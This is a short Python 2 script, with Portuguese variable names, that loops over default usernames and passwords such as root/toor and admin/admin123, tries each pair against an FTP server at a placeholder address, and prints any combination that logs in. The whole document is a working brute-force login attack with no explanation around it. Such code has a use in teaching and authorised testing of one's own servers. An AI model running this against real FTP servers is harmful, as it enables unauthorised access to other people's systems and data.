import ftplib

usuarios = ["root", "admin"]
senhas = ["toor", "admin", "admin123"]

for usuario in usuarios:
    for senha in senhas:
        ftp = ftplib.FTP("IP_do_servidor_FTP")
        try:
            ftp.login(usuario, senha)
        except Exception:
            pass
        else:
            print "USER:", usuario
            print "PASS:", senha
        finally:
            ftp.close()